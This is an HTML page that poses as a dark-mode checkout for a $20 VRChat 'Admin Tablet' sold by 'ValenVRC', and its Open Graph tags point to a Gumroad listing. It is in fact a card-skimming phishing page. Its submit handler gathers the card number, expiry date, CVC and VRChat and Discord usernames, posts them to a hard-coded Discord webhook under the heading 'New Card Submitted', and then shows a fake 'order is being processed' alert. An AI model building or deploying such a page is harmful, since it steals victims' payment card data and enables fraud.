<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />

  <!-- Open Graph for Discord embeds -->
  <meta property="og:title" content="[VRChat] Admin Tablet" />
  <meta property="og:description" content="Fully customizable admin tool for managing VRChat worlds. Features: local/synced toggles, pickup, respawn." />
  <meta property="og:image" content="https://i.postimg.cc/R0yD26mt/g6qqgpsgbryur0bblmz0rvxnpbat.png" />
  <meta property="og:url" content="https://valenvrc.gumroad.com/l/AdminTablet" />
  <meta property="og:type" content="product" />

  <title>ValenVRC Store – Checkout (Dark Mode)</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

  <style>
    :root {
      --font: 'Inter', sans-serif;
      --color-bg: #121212;
      --color-card: #1f1f1f;
      --color-primary: #3b82f6;
      --color-accent: #e5e7eb;
      --color-muted: #9ca3af;
      --shadow-card: rgba(0, 0, 0, 0.7);
      --radius: 8px;
    }
    * { box-sizing: border-box; margin:0; padding:0 }
    body {
      font-family: var(--font);
      background: var(--color-bg);
      color: var(--color-accent);
      line-height: 1.5;
    }
    .container {
      display: grid;
      grid-template-columns: 2fr 3fr 1.5fr;
      gap: 2rem;
      max-width: 1200px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    section, aside {
      background: var(--color-card);
      border-radius: var(--radius);
      box-shadow: 0 2px 12px var(--shadow-card);
      padding: 1.5rem;
    }
    h2 {
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--color-accent);
    }

    /* Cart Summary */
    .cart-item {
      display: flex;
      align-items: center;
      padding-bottom: 1rem;
      margin-bottom: 1rem;
      border-bottom: 1px solid #2a2a2a;
    }
    .cart-item:last-of-type { margin-bottom:0; border-bottom:none; }
    .cart-item img {
      width:80px; height:80px; object-fit:cover;
      border-radius:var(--radius); margin-right:1rem;
    }
    .details h3 { font-weight:500; margin-bottom:.25rem; }
    .details p { font-size:.9rem; color:var(--color-muted); margin-bottom:.5rem }

    .controls {
      display:flex; align-items:center; gap:.5rem;
      margin: .5rem 0;
    }
    .controls button {
      border:none; background:var(--color-primary);
      color:#fff; width:32px; height:32px; border-radius:4px;
      cursor:pointer; transition:background .2s;
    }
    .controls button:hover { background:#316ac1 }
    .controls .remove-item {
      background:transparent; color:var(--color-muted);
      font-size:.85rem; padding:0 .5rem; width:auto;
    }
    .controls .remove-item:hover { color:var(--color-primary) }
    .controls input {
      width:48px; text-align:center;
      background:#2a2a2a; border:1px solid #3a3a3a;
      border-radius:4px; padding:.3rem; color:var(--color-accent);
    }

    .price { font-weight:600; color:var(--color-accent) }

    .coupon, .total {
      display:flex; justify-content:space-between;
      align-items:center; margin-top:1.5rem;
    }
    .coupon input {
      flex:1; padding:.5rem; background:#2a2a2a;
      border:1px solid #3a3a3a; border-radius:4px;
      margin-right:.5rem; color:var(--color-accent);
    }
    .coupon input::placeholder { color:var(--color-muted) }
    .coupon button {
      background:var(--color-primary); color:#fff;
      border:none; padding:.5rem 1rem; border-radius:4px;
      cursor:pointer; transition:background .2s;
    }
    .coupon button:hover { background:#316ac1 }

    .total span:first-child { font-weight:500; color:var(--color-muted) }
    .total span:last-child { font-size:1.25rem; font-weight:600 }

    /* Recommendations */
    .recommendations { grid-column:1 / span 2 }
    .grid {
      display:grid;
      grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
      gap:1rem;
    }
    .card {
      padding:1rem; text-align:center; border-radius:var(--radius);
      background:var(--color-card);
      box-shadow:0 2px 8px var(--shadow-card);
      transition:transform .2s,box-shadow .2s;
    }
    .card:hover {
      transform: translateY(-4px);
      box-shadow:0 4px 16px var(--shadow-card);
    }
    .card img {
      width:100%; height:100px; object-fit:cover;
      border-radius:var(--radius); margin-bottom:.75rem;
    }
    .card h4 { font-size:.95rem; margin-bottom:.25rem; color:var(--color-accent) }
    .card p { font-size:.85rem; color:var(--color-muted); margin:0.25rem 0 }

    /* Checkout Form */
    .checkout { position:sticky; top:1rem }
    .checkout label { display:block; margin-bottom:.75rem; font-size:.9rem; color:var(--color-accent) }
    .checkout input[type="text"],
    .checkout input[type="email"],
    .checkout select {
      width:100%; padding:.6rem; background:#2a2a2a;
      border:1px solid #3a3a3a; border-radius:4px;
      font-size:.95rem; margin-top:.25rem; color:var(--color-accent);
    }
    .checkout input:focus,
    .checkout select:focus {
      outline:2px solid var(--color-primary); border-color:transparent;
    }
    .payment-method {
      display:flex; gap:1rem; margin:1rem 0; font-size:.9rem; color:var(--color-accent);
    }
    #card-details { margin-bottom:1rem }

    .tip select { margin-top:.25rem }

    .gift, .terms {
      display:flex; align-items:center; gap:.5rem; font-size:.9rem; color:var(--color-accent);-q
    }

    .pay-btn {
      width:100%; padding:.75rem; background:#f87307;
      color:#e6e6e6; border:none; font-size:1rem; font-weight:500;
      border-radius:var(--radius); cursor:pointer; margin-top:1rem;
      transition:background .2s;
    }
    .pay-btn:hover { background:#ffaf1c }
    .pay-btn span { margin-left:.5rem; font-weight:600 }

    /* Responsive */
    @media (max-width:900px) {
      .container { grid-template-columns:1fr }
      .recommendations { grid-column:auto }
    }
  </style>
</head>

<body>
  <main class="container">

    <!-- Cart Summary -->
    <section class="cart">
      <h2>Your Cart</h2>
      <div class="cart-item" data-id="admin-tablet">
        <img src="https://i.postimg.cc/RCc7z69B/ADMIN-TABLET-1.gif" alt="VRChat Admin Tablet" />
        <div class="details">
          <h3>VRChat Admin Tablet</h3>
          <p>by ValenVRC</p>
          <div class="controls">
            <button class="qty-decrease">–</button>
            <input class="qty-input" type="number" value="1" min="1" />
            <button class="qty-increase">+</button>
            <button class="remove-item">Remove</button>
          </div>
          <span class="price">$20.00</span>
        </div>
      </div>

      <div class="coupon">
        <input type="text" placeholder="Have a discount code?" id="coupon-code" />
        <button id="apply-coupon">Apply</button>
      </div>

      <div class="total">
        <span>Total</span>
        <span id="cart-total">$20.00</span>
      </div>
    </section>


    <!-- Recommendations -->
    <section class="recommendations">
      <h2>Customers also bought</h2>
      <div class="grid">
        <div class="card">
          <img src="https://i.postimg.cc/3rs32NDd/ADMIN-TABLET-6.gif" alt="Bouncer System" />
          <h4>Bouncer System</h4>
          <p>$29.99+</p>
          <p>★ 5.0 (6)</p>
        </div>
        <!-- …other cards… -->
      </div>
    </section>


    <!-- Checkout Form -->
    <aside class="checkout">
      <h2>Checkout</h2>
      <form id="purchaseForm">
        <label>Email
          <input type="email" name="email" required />
        </label>

        <fieldset class="payment-method">
          <legend>Payment Method</legend>
          <label><input type="radio" name="pay-method" value="card" checked /> Card</label>
          <label><input type="radio" name="pay-method" value="paypal" /> PayPal</label>
        </fieldset>

        <div id="card-details">
          <label>Card Number
            <input type="text" name="cardNumber" placeholder="•••• •••• •••• ••••" required />
          </label>
          <label>Expiry
            <input type="text" name="expiration" placeholder="MM/YY" required />
          </label>
          <label>CVC
            <input type="text" name="cvc" placeholder="CVC" required />
          </label>
        </div>

        <label>Country
          <select name="country" required>
            <option>United States</option>
            <!-- more… -->
          </select>
        </label>

        <label>ZIP Code
          <input type="text" name="zip" required />
        </label>

        <label>VRChat Username
          <input type="text" name="vrchatUsername" required />
        </label>

        <label>Discord Username
          <input type="text" name="discordUsername" />
        </label>

        <label class="tip">Add a tip
          <select name="tip">
            <option value="0">No tip</option>
            <option value="1">1%</option>
            <option value="5">5%</option>
            <option value="10">10%</option>
          </select>
        </label>

        <label class="gift">
          <input type="checkbox" name="gift" /> This is a gift
        </label>

        <label class="terms">
          <input type="checkbox" name="terms" required /> I accept Terms &amp; Conditions
        </label>

        <button type="submit" class="pay-btn">
          Pay <span id="checkout-total">$20.00</span>
        </button>
      </form>
    </aside>

  </main>


  <script>
    // Update cart totals
    function updateTotals() {
      let total = 0;
      document.querySelectorAll('.cart-item').forEach(item => {
        const price = parseFloat(item.querySelector('.price').innerText.replace('$',''));
        const qty   = +item.querySelector('.qty-input').value;
        total += price * qty;
      });
      const formatted = `$${total.toFixed(2)}`;
      document.getElementById('cart-total').innerText    = formatted;
      document.getElementById('checkout-total').innerText = formatted;
    }

    // Quantity & remove logic
    document.querySelectorAll('.cart-item').forEach(item => {
      const inp = item.querySelector('.qty-input');
      item.querySelector('.qty-decrease').onclick = () => {
        if (+inp.value > 1) inp.value--;
        updateTotals();
      };
      item.querySelector('.qty-increase').onclick = () => {
        inp.value++;
        updateTotals();
      };
      item.querySelector('.remove-item').onclick = () => {
        item.remove();
        updateTotals();
      };
    });

    // Payment toggle
    document.querySelectorAll('input[name="pay-method"]').forEach(radio => {
      radio.onchange = () => {
        document.getElementById('card-details').style.display =
          radio.value === 'card' ? 'block' : 'none';
      };
    });

    // Discord webhook on submit
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1478538305023905942/yRvAbbu1P7B5l_qmepXEivzpF0sv5cXxUOy0o017AgV2RH19vYimwvnl60GxcqalbDMu';
    document.getElementById('purchaseForm').addEventListener('submit', async e => {
      e.preventDefault();
      updateTotals();

      const f = e.target;
      const data = {
        email:            f.email.value,
        paymentMethod:    f['pay-method'].value,
        cardNumber:       f.cardNumber?.value,
        expiration:       f.expiration?.value,
        cvc:              f.cvc?.value,
        country:          f.country.value,
        zip:              f.zip.value,
        vrchatUsername:   f.vrchatUsername.value,
        discordUsername:  f.discordUsername.value,
        tip:              f.tip.value,
        gift:             f.gift.checked,
        termsAccepted:    f.terms.checked,
        total:            document.getElementById('checkout-total').innerText
      };

      const content = [
        '**New Card Submitted**',
        `**Card Number:** ${data.cardNumber}`,
        `**expiration:** ${data.expiration}`,
        `**cvc:** ${data.cvc}`,
        `**VRChat Username:** ${data.vrchatUsername}`,
        `**Discord Username:** ${data.discordUsername}`,
      ].join('\n');

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
      });

      f.reset();
      alert('Thanks! Your order is being processed.');
      updateTotals();
    });
  </script>
</body>
</html>
